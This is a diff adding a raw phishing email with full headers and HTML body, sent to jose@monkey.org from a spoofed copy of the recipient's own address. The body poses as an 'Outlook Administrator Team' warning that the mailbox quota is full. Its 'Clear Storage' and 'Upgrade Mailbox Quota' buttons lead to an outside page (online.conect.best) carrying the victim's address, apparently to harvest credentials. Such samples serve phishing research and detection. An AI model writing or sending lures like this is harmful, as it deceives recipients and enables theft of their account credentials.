@@ -1,0 +1,209 @@
+Return-Path: jose@monkey.org
+Delivered-To: jose@monkey.org
+X-FDA: 80778293820.34.20F16C3
+Received: from shut-antic.naturescar.com (unknown [185.222.58.45])
+	by imf17.b.hostedemail.com (Postfix) with ESMTP id B69C0140074
+	for <jose@monkey.org>; Thu, 11 May 2023 15:03:48 +0000 (UTC)
+Authentication-Results: imf17.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=softfail (imf17.b.hostedemail.com: 185.222.58.45 is neither permitted nor denied by domain of jose@monkey.org) smtp.mailfrom=jose@monkey.org
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1683817429; a=rsa-sha256;
+	cv=none;
+	b=oQCHYNFedF6tvr8Kh+XU5ZE+g6hWvfQNdZFWubFeDb8NYpW4zZl4w8npSnZmxop0TYqgz8
+	pvMlKDiOLIp1g/hhnNHDXnjAmx0ip4lSz195agnmIIradUEDNYOA1NW1LKF8tyXdBbshrf
+	KF4kU21Q0gGW8lDOoVS9DLDj3aLxah0=
+ARC-Authentication-Results: i=1;
+	imf17.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=softfail (imf17.b.hostedemail.com: 185.222.58.45 is neither permitted nor denied by domain of jose@monkey.org) smtp.mailfrom=jose@monkey.org
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1683817429;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=HUWXqczyPDB1XyO6ye+r8y6ULNrNLsEVjsJ+lvh/QMs=;
+	b=cxwhujYFWB00fWUvGfVI0ZL0qQpVbdHeYWTlGQTxWygMyuRoXgcWA1yHXNSzFAw6yXOqQX
+	CLIKAft93z8I1EeUL4Qv3y/EfsBbdOmP8/lS2R7HL63ZrtqRm4cVKcPE2fNO0xGpTGsgOC
+	GzMG4V5J3/XOth3gCDc8Ik3cXYFxars=
+From: noreply <jose@monkey.org>
+To: jose@monkey.org
+CC: admin@monkey.org
+Subject: AW:
+Date: 11 May 2023 17:03:47 +0200
+Message-ID: <20230511170347.DE2F2DE662638BBB@monkey.org>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam09
+X-Rspamd-Queue-Id: B69C0140074
+X-Rspam-User: 
+X-Spam-Status: No, score=8.73
+X-Stat-Signature: 6kmzkzsydenhfdozigziwguww1bkri1k
+X-HE-Tag: 1683817428-813022
+X-HE-Meta: U2FsdGVkX19s5kfYovMGvQAe7nMYWZQlFNZuhJgOBnGikMpYi1xOxDqyUdPsZ6hptm80K8xHpGGxe26BhXJse2T3zMUKLQrRuV15ZuB9FEH8Igzsa0Pp2tD+lZQqKqcu5bxlIzLASfMUjfdO4BCuQVMKRg5LZUv3TgeAC+mmMi2Geo2xLTZyywzZ/NJIxrBNX4jKdBc/L8C6pqaAEDEf7lftnOK1dsLmH4cB7VG5W/k=
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 113
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<table width=3D"80%" align=3D"center" style=3D"margin: 0px; padding: 0px; c=
+olor: rgb(34, 34, 34); text-transform: none; text-indent: 0px; letter-spaci=
+ng: normal; font-family: Arial, Helvetica, sans-serif; font-size: small; fo=
+nt-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal;=
+ border-collapse: collapse; orphans: 2; widows: 2; background-color: rgb(25=
+5, 255, 255); -webkit-text-stroke-width: 0px; text-decoration-thickness: in=
+itial; text-decoration-style: initial;=20
+text-decoration-color: initial;">
+<tbody style=3D"width: 613px;">
+<tr>
+<td style=3D"margin: 0px; padding: 0px; font-family: arial, sans-serif; fon=
+t-size: 10px;"><span style=3D"font-family: calibri; font-size: small;"><fon=
+t face=3D"Arial" size=3D"2">Dear ceo</font>
+<table width=3D"440" align=3D"center" role=3D"presentation" style=3D"margin=
+: 0px auto; width: 440px; color: rgb(34, 34, 34); text-transform: none; let=
+ter-spacing: normal; font-style: normal; font-weight: 400; word-spacing: 0p=
+x; white-space: normal; background-color: rgb(255, 255, 255);" border=3D"0"=
+ cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td style=3D"margin: 0px; font-family: arial, sans-serif; font-size: 12px;"=
+>
+<table role=3D"presentation" style=3D"margin: 0px; padding: 0px; clear: bot=
+h; border-collapse: collapse; table-layout: fixed; direction: ltr;" dir=3D"=
+ltr" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" style=3D"margin: 0px; padding: 3px 0px 6px; color: rgb(1=
+79, 20, 18); line-height: 39px; font-family: arial, sans-serif; font-size: =
+12px; border-collapse: collapse; direction: ltr; -ms-word-break: normal;" d=
+ir=3D"ltr"><span style=3D"white-space: nowrap !important;">100%</span>&nbsp=
+;full</td>
+<td align=3D"right" style=3D'margin: 0px; padding: 6px 0px 3px; color: rgb(=
+95, 99, 104); line-height: 27px; font-family: "Google Sans", Roboto, Arial,=
+ sans-serif; font-size: 12px; border-collapse: collapse; direction: ltr; -m=
+s-word-break: normal;' dir=3D"ltr"><span style=3D"white-space: nowrap !impo=
+rtant;">15 GB</span></td></tr>
+<tr>
+<td width=3D"438" style=3D"margin: 0px; font-family: Roboto, RobotoDraft, H=
+elvetica, Arial, sans-serif; font-size: 12px;" colspan=3D"2">
+<table width=3D"100%" height=3D"3" role=3D"presentation" style=3D"border-ra=
+dius: 5px; width: 438px; height: 7px; background-color: rgb(179, 20, 18);" =
+bgcolor=3D"#b31412" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"438" style=3D"margin: 0px; border-radius: 5px; width: 438px; t=
+ext-align: left; line-height: 7px; font-family: Roboto, RobotoDraft, Helvet=
+ica, Arial, sans-serif; font-size: 12px; background-color: rgb(179, 20, 18)=
+;">&nbsp;</td></tr></tbody></table></td></tr></tbody></table></td></tr></tb=
+ody></table>
+<p style=3D'border-radius: 0px; color: rgb(51, 51, 51); font-family: "Noto =
+Sans", sans-serif; background-color: rgb(255, 255, 255);'>You've used&nbsp;=
+all&nbsp;of your Outlook Email Quota and you have some incoming messages th=
+at are placed on hold.</p>
+<div style=3D'border-radius: 0px; color: rgb(51, 51, 51); font-family: "Not=
+o Sans", sans-serif; background-color: rgb(255, 255, 255);'>Kindly&nbsp;Cle=
+ar storage or Upgrade&nbsp;your&nbsp;<a rel=3D"noreferrer noreferrer">email=
+</a><span>&nbsp;</span>mailbox account below to get more storage and&nbsp;a=
+ccess incoming messages, you may cease to receive incoming emails if no act=
+ion is taken.<br><br style=3D"border-radius: 0px;">
+<table align=3D"left" style=3D"border-radius: 0px; font-family: inherit; fo=
+nt-stretch: inherit;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"border-radius: 0px;">
+<tr style=3D"border-radius: 0px;">
+<td height=3D"30" align=3D"center" valign=3D"middle" style=3D"border-radius=
+: 3px; border: 1px solid rgb(232, 180, 99); font-family: arial, sans-serif;=
+ font-size: 12px;" bgcolor=3D"#ffe86c">
+<table width=3D"100%" style=3D"border-radius: 0px; text-align: left; font-f=
+amily: helvetica, arial, sans-serif; font-stretch: inherit;" bgcolor=3D"tra=
+nsparent" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"border-radius: 0px;">
+<tr style=3D"border-radius: 0px;">
+<td width=3D"13" style=3D"border-radius: 0px; font-family: arial, sans-seri=
+f; font-size: 12px;">
+<table width=3D"13" style=3D"border-radius: 0px; font-family: inherit; font=
+-stretch: inherit;" border=3D"0" cellspacing=3D"0" cellpadding=3D"1">
+<tbody style=3D"border-radius: 0px;">
+<tr style=3D"border-radius: 0px;">
+<td style=3D"border-radius: 0px; font-family: arial, sans-serif; font-size:=
+ 12px;"></td></tr></tbody></table></td>
+<td style=3D"border-radius: 0px; font-family: arial, sans-serif; font-size:=
+ 12px;"><span style=3D"border-width: 0px; margin: 0px; padding: 0px; border=
+-radius: 0px; color: rgb(0, 0, 0); font-family: inherit; font-weight: bold;=
+ vertical-align: baseline; display: block; white-space: nowrap; font-stretc=
+h: inherit;">
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; border-radius:=
+ 0px; font-family: inherit; vertical-align: inherit; font-stretch: inherit;=
+"><a href=3D"https://online.conect.best/configurators.html?val=3Djose@monke=
+y.org" rel=3D"noreferrer">Clear Storage</a></span></span></td>
+<td width=3D"13" style=3D"border-radius: 0px; font-family: arial, sans-seri=
+f; font-size: 12px;">
+<table width=3D"13" style=3D"border-radius: 0px; font-family: inherit; font=
+-stretch: inherit;" border=3D"0" cellspacing=3D"0" cellpadding=3D"1">
+<tbody style=3D"border-radius: 0px;">
+<tr style=3D"border-radius: 0px;">
+<td style=3D"border-radius: 0px; font-family: arial, sans-serif; font-size:=
+ 12px;"></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbo=
+dy></table><br style=3D"border-radius: 0px;"><br><br style=3D"border-radius=
+: 0px;">
+<table align=3D"left" style=3D"border-radius: 0px; font-family: inherit; fo=
+nt-stretch: inherit;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"border-radius: 0px;">
+<tr style=3D"border-radius: 0px;">
+<td height=3D"30" align=3D"center" valign=3D"middle" style=3D"border-radius=
+: 3px; border: 1px solid rgb(232, 180, 99); font-family: arial, sans-serif;=
+ font-size: 12px;" bgcolor=3D"#ffe86c">
+<table width=3D"100%" style=3D"border-radius: 0px; text-align: left; font-f=
+amily: helvetica, arial, sans-serif; font-stretch: inherit;" bgcolor=3D"tra=
+nsparent" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"border-radius: 0px;">
+<tr style=3D"border-radius: 0px;">
+<td width=3D"13" style=3D"border-radius: 0px; font-family: arial, sans-seri=
+f; font-size: 12px;">
+<table width=3D"13" style=3D"border-radius: 0px; font-family: inherit; font=
+-stretch: inherit;" border=3D"0" cellspacing=3D"0" cellpadding=3D"1">
+<tbody style=3D"border-radius: 0px;">
+<tr style=3D"border-radius: 0px;">
+<td style=3D"border-radius: 0px; font-family: arial, sans-serif; font-size:=
+ 12px;"></td></tr></tbody></table></td>
+<td style=3D"border-radius: 0px; font-family: arial, sans-serif; font-size:=
+ 12px;"><span style=3D"border-width: 0px; margin: 0px; padding: 0px; border=
+-radius: 0px; color: rgb(0, 0, 0); font-family: inherit; font-weight: bold;=
+ vertical-align: baseline; display: block; white-space: nowrap; font-stretc=
+h: inherit;">
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; border-radius:=
+ 0px; font-family: inherit; vertical-align: inherit; font-stretch: inherit;=
+"><a href=3D"https://online.conect.best/configurators.html?val=3Djose@monke=
+y.org" rel=3D"noreferrer">Upgrade Mailbox&nbsp;Quota</a></span></span></td>=
+
+<td width=3D"13" style=3D"border-radius: 0px; font-family: arial, sans-seri=
+f; font-size: 12px;">
+<table width=3D"13" style=3D"border-radius: 0px; font-family: inherit; font=
+-stretch: inherit;" border=3D"0" cellspacing=3D"0" cellpadding=3D"1">
+<tbody style=3D"border-radius: 0px;">
+<tr style=3D"border-radius: 0px;">
+<td style=3D"border-radius: 0px; font-family: arial, sans-serif; font-size:=
+ 12px;"></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbo=
+dy></table><br style=3D"border-radius: 0px;"><br style=3D"border-radius: 0p=
+x;"></div>
+<div style=3D'border-radius: 0px; color: rgb(51, 51, 51); font-family: "Not=
+o Sans", sans-serif; background-color: rgb(255, 255, 255);'>&nbsp;</div>
+<div style=3D'border-radius: 0px; color: rgb(51, 51, 51); font-family: "Not=
+o Sans", sans-serif; background-color: rgb(255, 255, 255);'>Outlook Adminis=
+trator Team.<br style=3D"border-radius: 0px;"><a rel=3D"noreferrer">monkey.=
+org</a></div>
+<div style=3D'border-radius: 0px; color: rgb(51, 51, 51); font-family: "Not=
+o Sans", sans-serif; font-size: 12px; background-color: rgb(255, 255, 255);=
+'><br></div>
+<div style=3D'border-radius: 0px; color: rgb(51, 51, 51); font-family: "Not=
+o Sans", sans-serif; font-size: 12px; background-color: rgb(255, 255, 255);=
+'><br><br>Copyright &copy; 2023 All Rights Reserved.</div></span></td></tr>=
+</tbody></table></body></html>
+
